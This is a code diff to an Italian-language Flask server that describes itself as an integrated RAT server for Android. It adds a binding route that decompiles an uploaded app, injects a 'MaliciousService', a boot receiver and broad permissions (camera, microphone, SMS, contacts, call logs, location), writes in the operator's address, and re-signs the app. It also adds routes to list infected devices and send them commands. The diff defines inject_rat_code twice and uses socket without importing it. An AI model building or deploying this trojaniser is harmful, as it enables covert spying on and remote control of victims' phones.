@@ -1,4 +1,5 @@
-from flask import Flask, request, render_template, jsonify, redirect, url_for, session
+from flask import Flask, request, render_template, jsonify, redirect, url_for, session, send_from_directory
+from werkzeug.utils import secure_filename
 import os, subprocess, tempfile, shutil, threading, time, datetime, re
 from functools import wraps
 import xml.etree.ElementTree as ET
@@ -13,10 +14,124 @@ import requests
 app = Flask(__name__)
 app.secret_key = "modificami_con_qualcosa_di_lungo_e_segreto"
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
-app.config['BASE_UPLOAD_FOLDER'] = 'static/uploads'
-app.config['BASE_SCREENSHOT_FOLDER'] = 'static/screenshots'
-app.config['BASE_FILE_FOLDER'] = 'static/files'
-app.config['BASE_CAMERA_FOLDER'] = 'static/camera'
+app.config['BASE_UPLOAD_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
+app.config['BASE_SCREENSHOT_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/screenshots')
+app.config['BASE_FILE_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/files')
+app.config['BASE_CAMERA_FOLDER'] = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static/camera')
+
+# Ensure all folders exist
+os.makedirs(app.config['BASE_UPLOAD_FOLDER'], exist_ok=True)
+os.makedirs(app.config['BASE_SCREENSHOT_FOLDER'], exist_ok=True)
+os.makedirs(app.config['BASE_FILE_FOLDER'], exist_ok=True)
+os.makedirs(app.config['BASE_CAMERA_FOLDER'], exist_ok=True)
+os.makedirs(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static'), exist_ok=True)
+
+# Template filter for timestamp formatting
+@app.template_filter('timestamp_to_time')
+def timestamp_to_time(timestamp):
+    if not timestamp:
+        return "N/A"
+    return datetime.datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')
+
+# Helper functions
+def get_user_folder(base_folder, username):
+    """Get a user-specific folder and ensure it exists"""
+    folder = os.path.join(base_folder, username)
+    os.makedirs(folder, exist_ok=True)
+    return folder
+
+def run_cmd(username, cmd):
+    """Run a command and return its output"""
+    log_cmd(username, cmd)
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+    if result.returncode != 0:
+        log_cmd(username, f"Command failed with code {result.returncode}: {result.stderr}")
+        raise Exception(f"Command failed: {result.stderr}")
+    return result.stdout
+
+def log_cmd(username, message):
+    """Log a command to the user's log"""
+    if username not in flask_user_logs:
+        flask_user_logs[username] = []
+    flask_user_logs[username].append({
+        "timestamp": int(time.time()),
+        "message": message
+    })
+
+def ensure_keystore(username):
+    """Ensure a debug keystore exists for signing APKs"""
+    keystore_path = os.path.join(get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username), "debug.keystore")
+    if not os.path.exists(keystore_path):
+        # Create a debug keystore
+        cmd = f"keytool -genkey -v -keystore {keystore_path} -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname \"CN=Android Debug,O=Android,C=US\""
+        subprocess.run(cmd, shell=True, check=True)
+    return keystore_path
+
+def inject_rat_code(username, decoded_dir, server_ip, flask_port, rat_port):
+    """Inject RAT code into the decoded APK"""
+    manifest_path = os.path.join(decoded_dir, "AndroidManifest.xml")
+    
+    # Check if the manifest file exists
+    if not os.path.exists(manifest_path):
+        log_cmd(username, f"AndroidManifest.xml not found at {manifest_path}")
+        raise Exception("AndroidManifest.xml not found")
+    
+    # Read the manifest file
+    with open(manifest_path, 'r', encoding='utf-8') as f:
+        manifest_content = f.read()
+    
+    # Add permissions if they don't exist
+    permissions = [
+        "android.permission.INTERNET",
+        "android.permission.ACCESS_NETWORK_STATE",
+        "android.permission.ACCESS_FINE_LOCATION",
+        "android.permission.ACCESS_COARSE_LOCATION",
+        "android.permission.RECEIVE_BOOT_COMPLETED",
+        "android.permission.READ_EXTERNAL_STORAGE",
+        "android.permission.WRITE_EXTERNAL_STORAGE",
+        "android.permission.CAMERA",
+        "android.permission.RECORD_AUDIO",
+        "android.permission.READ_CONTACTS",
+        "android.permission.READ_SMS",
+        "android.permission.READ_CALL_LOG",
+        "android.permission.FOREGROUND_SERVICE"
+    ]
+    
+    for permission in permissions:
+        if f'android:name="{permission}"' not in manifest_content:
+            # Add the permission before the </manifest> tag
+            manifest_content = manifest_content.replace('</manifest>', f'    <uses-permission android:name="{permission}" />\n</manifest>')
+    
+    # Add the receiver and service if they don't exist
+    if 'android:name="com.example.android.BootReceiver"' not in manifest_content:
+        # Add the receiver before the </application> tag
+        receiver_xml = '''    <receiver android:name="com.example.android.BootReceiver" android:enabled="true" android:exported="true">
+        <intent-filter>
+            <action android:name="android.intent.action.BOOT_COMPLETED" />
+            <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+        </intent-filter>
+    </receiver>
+'''
+        manifest_content = manifest_content.replace('</application>', f'{receiver_xml}</application>')
+    
+    if 'android:name="com.example.android.MaliciousService"' not in manifest_content:
+        # Add the service before the </application> tag
+        service_xml = '''    <service android:name="com.example.android.MaliciousService" android:enabled="true" android:exported="true" />
+'''
+        manifest_content = manifest_content.replace('</application>', f'{service_xml}</application>')
+    
+    # Add the activity if it doesn't exist
+    if 'android:name="com.example.android.PermissionRequestActivity"' not in manifest_content:
+        # Add the activity before the </application> tag
+        activity_xml = '''    <activity android:name="com.example.android.PermissionRequestActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+'''
+        manifest_content = manifest_content.replace('</application>', f'{activity_xml}</application>')
+    
+    # Write the modified manifest back to the file
+    with open(manifest_path, 'w', encoding='utf-8') as f:
+        f.write(manifest_content)
+    
+    log_cmd(username, "AndroidManifest.xml modified successfully")
 app.config['BASE_MIC_FOLDER'] = 'static/mic'
 os.makedirs(app.config['BASE_UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['BASE_SCREENSHOT_FOLDER'], exist_ok=True)
@@ -30,11 +145,11 @@ user_configs = {}
 # Get your actual IP address - you need to replace this with your actual local IP
 # You can find it by running: ipconfig (Windows) or ifconfig (Linux/Mac)
 # Flask web interface configuration - ONLY this should be changed in code
-FLASK_WEB_PORT = "8080"  # Port for Flask web interface - change this if needed
+FLASK_WEB_PORT = "12000"  # Port for Flask web interface - change this if needed
 
 # RAT Configuration - These will be set dynamically by users during binding
 DEFAULT_RAT_IP = "127.0.0.1"    # Default IP for RAT connections
-DEFAULT_RAT_PORT = "4444"      # Default port for RAT connections
+DEFAULT_RAT_PORT = "12000"      # Default port for RAT connections
 
 # Global variables for dynamic configuration
 CURRENT_FLASK_PORT = FLASK_WEB_PORT
@@ -245,12 +360,24 @@ def inject_rat_code(username, decoded_path, server_ip, server_port, flask_port):
     except Exception as e:
         raise RuntimeError(f"Error copying your generated Smali: {str(e)}")
     
-    # Generate config.ini with server IP, Flask Port (for API calls) and RAT Port (for socket connections)
-    config_content = f"SERVER_IP={server_ip}\nFLASK_PORT={flask_port}\nRAT_PORT={server_port}\n"
+    # Get local IP address
+    local_ip = socket.gethostbyname(socket.gethostname())
+    if local_ip == "127.0.0.1":
+        # Try to get a better local IP
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+        except:
+            local_ip = "192.168.1.100"  # Fallback to a common local IP
+    
+    # Generate config.ini with both local and public IPs, Flask Port (for API calls) and RAT Port (for socket connections)
+    config_content = f"LOCAL_IP={local_ip}\nPUBLIC_IP={server_ip}\nFLASK_PORT={flask_port}\nRAT_PORT={server_port}\n"
     config_file_path = os.path.join(assets_dir_path, "config.ini")
     with open(config_file_path, "w") as f:
         f.write(config_content)
-    append_flask_log(username, f"Injected config file with Flask port {flask_port} for API calls and RAT port {server_port} for socket connections: {config_file_path}")
+    append_flask_log(username, f"Injected config file with Local IP {local_ip}, Public IP {server_ip}, Flask port {flask_port} for API calls and RAT port {server_port} for socket connections: {config_file_path}")
     
     ANDROID_NS = "{http://schemas.android.com/apk/res/android}"
     tree = ET.parse(manifest_path)
@@ -932,9 +1059,236 @@ def send_rat_command():
     append_flask_log(username, f"Command '{command}' queued for device {device_id}")
     return jsonify({"status": "ok", "message": "Command sent"})
 
+@app.route('/dashboard')
+def dashboard():
+    """Main dashboard page"""
+    # Get local IP address
+    local_ip = socket.gethostbyname(socket.gethostname())
+    if local_ip == "127.0.0.1":
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+        except:
+            local_ip = "127.0.0.1"
+    
+    # Try to get public IP
+    public_ip = "Non disponibile"
+    try:
+        response = requests.get('https://api.ipify.org', timeout=3)
+        if response.status_code == 200:
+            public_ip = response.text
+    except:
+        pass
+    
+    # Count connected devices
+    device_count = len(devices_data)
+    
+    # Get server uptime
+    if 'server_start_time' in globals():
+        uptime = int(time.time() - server_start_time)
+        uptime_str = f"{uptime // 3600}h {(uptime % 3600) // 60}m {uptime % 60}s"
+    else:
+        uptime_str = "N/A"
+    
+    return render_template('dashboard.html', 
+                          local_ip=local_ip,
+                          public_ip=public_ip,
+                          port=FLASK_WEB_PORT,
+                          device_count=device_count,
+                          uptime=uptime_str)
+
+@app.route('/bind', methods=['GET', 'POST'])
+@login_required
+def bind_apk():
+    """APK binding page"""
+    if request.method == 'POST':
+        # Check if the post request has the file part
+        if 'apk_file' not in request.files:
+            return render_template('bind.html', error="Nessun file selezionato")
+        
+        apk_file = request.files['apk_file']
+        if apk_file.filename == '':
+            return render_template('bind.html', error="Nessun file selezionato")
+        
+        # Get form data
+        local_ip = request.form.get('local_ip', '')
+        public_ip = request.form.get('public_ip', '')
+        
+        if not local_ip:
+            # Get local IP address
+            local_ip = socket.gethostbyname(socket.gethostname())
+            if local_ip == "127.0.0.1":
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.connect(("8.8.8.8", 80))
+                    local_ip = s.getsockname()[0]
+                    s.close()
+                except:
+                    local_ip = "127.0.0.1"
+        
+        if not public_ip:
+            # Try to get public IP
+            try:
+                response = requests.get('https://api.ipify.org', timeout=3)
+                if response.status_code == 200:
+                    public_ip = response.text
+            except:
+                public_ip = local_ip  # Fallback to local IP
+        
+        # Save the uploaded file
+        upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], session['username'])
+        timestamp = int(time.time())
+        original_filename = secure_filename(apk_file.filename)
+        apk_path = os.path.join(upload_folder, f"{timestamp}_{original_filename}")
+        apk_file.save(apk_path)
+        
+        # Create a unique working directory
+        work_dir = os.path.join(upload_folder, f"work_{timestamp}")
+        os.makedirs(work_dir, exist_ok=True)
+        
+        # Decode the APK
+        decoded_dir = os.path.join(work_dir, "decoded")
+        try:
+            run_cmd(session['username'], f"apktool d -f {apk_path} -o {decoded_dir}")
+            
+            # Create assets directory if it doesn't exist
+            assets_dir = os.path.join(decoded_dir, "assets")
+            os.makedirs(assets_dir, exist_ok=True)
+            
+            # Create config.ini file
+            config_content = f"LOCAL_IP={local_ip}\nPUBLIC_IP={public_ip}\nFLASK_PORT={FLASK_WEB_PORT}\nRAT_PORT={FLASK_WEB_PORT}\n"
+            with open(os.path.join(assets_dir, "config.ini"), "w") as f:
+                f.write(config_content)
+            
+            # Copy smali files
+            smali_dir = os.path.join(decoded_dir, "smali")
+            if not os.path.exists(smali_dir):
+                smali_dir = os.path.join(decoded_dir, "smali_classes2")
+                if not os.path.exists(smali_dir):
+                    os.makedirs(smali_dir)
+            
+            target_dir = os.path.join(smali_dir, "com", "example", "android")
+            os.makedirs(target_dir, exist_ok=True)
+            
+            # Copy all smali files from templates
+            source_dir = os.path.join("smali_templates", "com", "example", "android")
+            for item in os.listdir(source_dir):
+                s_item = os.path.join(source_dir, item)
+                d_item = os.path.join(target_dir, item)
+                if os.path.isdir(s_item):
+                    shutil.copytree(s_item, d_item, dirs_exist_ok=True)
+                else:
+                    shutil.copy2(s_item, d_item)
+            
+            # Modify AndroidManifest.xml to add permissions and components
+            inject_rat_code(session['username'], decoded_dir, public_ip, FLASK_WEB_PORT, FLASK_WEB_PORT)
+            
+            # Build the modified APK
+            output_apk = os.path.join(work_dir, f"modified_{original_filename}")
+            run_cmd(session['username'], f"apktool b -f {decoded_dir} -o {output_apk}")
+            
+            # Sign the APK
+            keystore_path = ensure_keystore(session['username'])
+            signed_apk = os.path.join(upload_folder, f"bound_{timestamp}_{original_filename}")
+            run_cmd(session['username'], f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore_path} -storepass android -keypass android {output_apk} androiddebugkey")
+            shutil.copy2(output_apk, signed_apk)
+            
+            # Clean up
+            shutil.rmtree(work_dir)
+            
+            # Create download link
+            download_link = f"/download/{session['username']}/bound_{timestamp}_{original_filename}"
+            
+            return render_template('bind_success.html', 
+                                  filename=original_filename,
+                                  local_ip=local_ip,
+                                  public_ip=public_ip,
+                                  port=FLASK_WEB_PORT,
+                                  download_link=download_link)
+            
+        except Exception as e:
+            return render_template('bind.html', error=f"Errore durante il binding: {str(e)}")
+    
+    # GET request - show the form
+    # Get local IP address
+    local_ip = socket.gethostbyname(socket.gethostname())
+    if local_ip == "127.0.0.1":
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+        except:
+            local_ip = "127.0.0.1"
+    
+    # Try to get public IP
+    public_ip = ""
+    try:
+        response = requests.get('https://api.ipify.org', timeout=3)
+        if response.status_code == 200:
+            public_ip = response.text
+    except:
+        pass
+    
+    return render_template('bind.html', local_ip=local_ip, public_ip=public_ip, port=FLASK_WEB_PORT)
+
+@app.route('/download/<username>/<filename>')
+@login_required
+def download_file(username, filename):
+    """Download a bound APK file"""
+    if username != session['username']:
+        return "Accesso negato", 403
+    
+    upload_folder = get_user_folder(app.config['BASE_UPLOAD_FOLDER'], username)
+    return send_from_directory(upload_folder, filename, as_attachment=True)
+
+@app.route('/devices')
+@login_required
+def list_devices():
+    """List all connected devices"""
+    return render_template('devices.html', devices=devices_data)
+
+@app.route('/device/<device_id>')
+@login_required
+def device_detail(device_id):
+    """Show details for a specific device"""
+    if device_id not in devices_data:
+        return "Dispositivo non trovato", 404
+    
+    device = devices_data[device_id]
+    return render_template('device_detail.html', device_id=device_id, device=device)
+
+@app.route('/send_command/<device_id>', methods=['POST'])
+@login_required
+def send_command(device_id):
+    """Send a command to a device"""
+    if device_id not in devices_data:
+        return jsonify({"status": "error", "message": "Dispositivo non trovato"}), 404
+    
+    command = request.form.get('command', '')
+    if not command:
+        return jsonify({"status": "error", "message": "Comando vuoto"}), 400
+    
+    # Add the command to the device's command queue
+    with data_lock:
+        if 'commands' not in devices_data[device_id]:
+            devices_data[device_id]['commands'] = []
+        
+        devices_data[device_id]['commands'].append({
+            "type": "command",
+            "action": command,
+            "timestamp": int(time.time())
+        })
+    
+    return jsonify({"status": "success", "message": f"Comando '{command}' inviato al dispositivo"})
+
 if __name__ == "__main__":
     # Integrated Flask RAT Server - Everything managed in one place
     FLASK_PORT = int(FLASK_WEB_PORT)
+    server_start_time = time.time()
+    
     print(f"\n🔥 INTEGRATED FLASK RAT SERVER")
     print(f"🌐 Web Interface: http://0.0.0.0:{FLASK_PORT}")
     print(f"📱 RAT Devices connect to: http://your_ip:{FLASK_PORT}/api/rat_connect")
@@ -944,7 +1298,7 @@ if __name__ == "__main__":
     print(f"   - Real-time command and control")
     print(f"   - File uploads and downloads")
     print(f"\n🔧 Configuration:")
-    print(f"   - Only change FLASK_WEB_PORT in code if needed (default: 8080)")
+    print(f"   - Only change FLASK_WEB_PORT in code if needed (default: {FLASK_WEB_PORT})")
     print(f"   - Use any IP:PORT combination when binding APKs")
     print(f"   - Devices will connect to Flask server on specified IP:PORT")
     print(f"\n🚀 Starting server...\n")
